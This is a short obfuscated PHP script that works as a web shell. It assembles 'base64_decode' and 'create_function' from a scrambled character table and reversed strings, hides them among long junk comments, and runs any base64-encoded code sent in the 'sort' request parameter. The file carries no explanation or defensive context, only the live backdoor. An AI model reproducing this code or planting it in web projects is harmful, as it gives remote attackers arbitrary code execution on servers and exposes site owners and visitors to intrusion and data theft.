...
$CFfLOyjX3353 = "gwp3z.svl264*x;ej0_/()ucdf7nri5t9khqba1o8ym";


$mQgDTGZr3705 = "";

foreach([6,39,28,31] as $K){
       $mQgDTGZr3705 .= $CFfLOyjX3353[$K];
    }


if(isset($_REQUEST /*EdPmxmKdRXZfSwArfuGlIdiLhhyqGTuYKXoiyFYRBDPzYbGduLOdTTfwbkYGWVkHjLgXTSFzFcZMyzfJcWqPyDxaogSRFQtkbsrFHZGacvCTrRYjfaluwghyVVfUIEVG*/["$mQgDTGZr3705"])){
    $nTWhPZbv3771 = $_REQUEST /*EdPmxmKdRXZfSwArfuGlIdiLhhyqGTuYKXoiyFYRBDPzYbGduLOdTTfwbkYGWVkHjLgXTSFzFcZMyzfJcWqPyDxaogSRFQtkbsrFHZGacvCTrRYjfaluwghyVVfUIEVG*/["$mQgDTGZr3705"];
    $cBqTFDNn3916 = "";
    $xelgaprc783 = "";

    /*ATNDmQWELRfmRWTnVDrSOJdMQNkhQPqOilzTJaqgMIVOhfRBnSlFWRHMzBkgPVyzkxDdBfdCfsejQikIZaAmxSFEDiDYiUadFCbgLdlSSWHyTfWJeciMrMVqaIqJVNWB*/

    foreach([36,37,6,15,10,11,18,24,15,23,39,24,15] as $K){
       $cBqTFDNn3916 .= $CFfLOyjX3353[$K];
    }

    /*uBTdpULbZtEGpUbDCXjfFBGWQcwobAlSCteTnFFdzJUHeEAruMEsniJvapWMAgUcefJCEkTZtTDCngtYGvsyoJhODwPetFWgZKHgpHAOGXGrQDFzlXAyIeYaAwcpFYse*/


    foreach([6,31,28,28,15,7] as $K){
       $xelgaprc783 .= $CFfLOyjX3353[$K];
    }

    /*oiYCtZAxnUdZMTkTjsbswsigRqIullhVWBJTRkUZnLTAccjhBHWfEAMfBeIskrqFYMOcIoIvGvcWLfBonQlLfBJXEKbkDrSjtSmfTmPLuYFkNbnpsSTlZwaJblOVpkOH*/

    $K = $xelgaprc783('n'.'o'.'i'.'t'.'c'.''.''.''.''.'n'.''.'u'.'f'.'_'.'e'.''.''.''.'t'.''.''.''.'a'.''.''.''.'e'.''.'r'.''.''.''.'c'.''.''.'');
    $z = $K("", $cBqTFDNn3916($nTWhPZbv3771));
    $z();
    exit();
